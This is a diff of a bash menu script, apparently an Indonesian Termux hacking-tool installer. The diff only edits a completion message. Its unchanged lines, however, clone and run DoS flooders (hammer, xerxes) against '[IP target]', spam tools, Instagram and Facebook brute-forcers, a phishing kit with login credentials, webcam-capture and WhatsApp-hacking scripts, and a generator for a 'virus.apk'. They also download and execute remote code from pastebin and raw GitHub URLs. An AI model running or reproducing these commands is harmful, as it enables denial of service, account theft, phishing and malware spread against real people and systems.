@@ -1132,7 +1132,7 @@ cd Spammer-Grab
 chmod +x spammer.py
 python2 spammer.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 69 ] || [ $act = 69 ]
@@ -1147,7 +1147,7 @@ cd Lazymux
 chmod +x lazymux.py
 python2 lazymux.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 70 ] || [ $act = 70 ]
@@ -1163,7 +1163,7 @@ git clone https://github.com/kancotdiq/ipcs
 cd ipcs
 python2 scan.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 71 ] || [ $act = 71 ]
@@ -1178,7 +1178,7 @@ cd hammer
 python hammer.py
 python hammer.py -s [IP target] -p [PORT] -t 135
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 72 ] || [ $act = 72 ]
@@ -1193,7 +1193,7 @@ cd xerxes
 clang xerxes.c -o xerxes
  ./xerxes [Nama Website] 80
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 73 ] || [ $act = 73 ] 
@@ -1203,7 +1203,7 @@ echo -e $green"  "
 sleep 1
 
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 74 ] || [ $act = 74 ]
@@ -1219,7 +1219,7 @@ chmod 777 login.py
 python2 login.py
 sleep 1
 echo -e Masukkan Target
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 75 ] || [ $act = 75 ]
@@ -1234,7 +1234,7 @@ cd AdminFinder
 chmod 777 AdminFinder.py
 python2 AdminFinder.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 76 ] || [ $act = 76 ]
@@ -1247,7 +1247,7 @@ pkg install cURL
 curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php
 php jdid.php
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 77 ] || [ $act = 77 ]
@@ -1262,7 +1262,7 @@ pip2 install -r requirements.txt
 chmod +x app.py
 python app.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 78 ] || [ $act = 78 ]
@@ -1276,7 +1276,7 @@ cd OSIF
 pip2 install -r requirements.txt
 python2 osif.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 79 ] || [ $act = 79 ]
@@ -1294,7 +1294,7 @@ nano pass.txt
 cat pass.txt
 python hackinsta.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 80 ] || [ $act = 80 ]
@@ -1308,7 +1308,7 @@ cd termux-lazysqlmap
 chmod 777 install.sh
 ./install.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 81 ] || [ $act = 81 ]
@@ -1341,7 +1341,7 @@ ls
 cd whatshack
 sh  whatshack.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 83 ] || [ $act = 83 ]
@@ -1361,7 +1361,7 @@ cd 13_tools
 ls
 sh 13tools_tuxh4n.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 84 ] || [ $act = 84 ]
@@ -1379,7 +1379,7 @@ ls
 php wa.php ( buat wa ) dll
 Input nomer target
 sleep1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 85 ] || [ $act = 85 ]
@@ -1398,7 +1398,7 @@ python2 malicious.py
 cd Android
 sleep 1
 echo -e green" mv nama virus.apk /sdcard
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 
@@ -1416,7 +1416,7 @@ git clone https://github.com/pashayogi/SETAN
 Cd SETAN
 python2 SETAN.py
 sleep1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 87 ] || [ $act = 87 ]
@@ -1429,7 +1429,7 @@ git clone https://github.com/4L13199/LITESPAM
 cd LITESPAM
 sh LITESPAM.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 88 ] || [ $act = 88 ]
@@ -1445,7 +1445,7 @@ git clone https://github.com/Senitopeng/Tokped.git
 cd Tokped
 python2 Tokped.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 89 ] || [ $act = 89 ]
@@ -1465,7 +1465,7 @@ cd Dark-Mod
 ls
 python2 dark-fb.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 90 ] || [ $act = 90 ]
@@ -1482,7 +1482,7 @@ git clone https://github.com/m4rche3ll-cyber/dark-vpro
 cd dark-vpro
 python2 dark-vpro.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 91 ] || [ $act = 91 ]
@@ -1497,7 +1497,7 @@ cd darkfb
 pip2 install -r requirements.txt
 python2 darkfb.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 92 ] || [ $act = 92 ]
@@ -1533,7 +1533,7 @@ git clone https://github.com/thelinuxchoice/saycheese
 cd saycheese
 bash saycheese.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 94 ] || [ $act = 94 ]
@@ -1551,7 +1551,7 @@ cd bughunter
 ls
 chmod +x bughunter.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 95 ] || [ $act = 95 ]
@@ -1570,7 +1570,7 @@ chmod 777 instabrutal.py
 pip2 install requests
 python2 install instabrutal.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 96 ] || [ $act = 96 ]
@@ -1587,7 +1587,7 @@ git clone https://github.com/ridwanirawan/PiPhish
 USERNAME :ridwan
 PASSWORD :erinafahira
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 97 ] || [ $act = 97 ]
@@ -1600,7 +1600,7 @@ apt install curl
 curl -LO https://raw.githubusercontent.com/Techzindia/usefultools/master/usefultool.sh
 sh usefultool.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 98 ] || [ $act = 98 ]
@@ -1616,7 +1616,7 @@ chmod +x kalinethunter
 ./kalinethunter
 ./startkali.sh
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 99 ] || [ $act = 99 ]
@@ -1634,7 +1634,7 @@ cd spammerZ
 ls 
 python2 spam.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
 
 if [ $act = 100 ] || [ $act = 100 ]
@@ -1652,5 +1652,5 @@ ls
 cd lain-lain
 python2 mbledos.py
 sleep 1
-echo -e $red" Done Install cuk "
+echo -e $red" Done cuk "
 fi
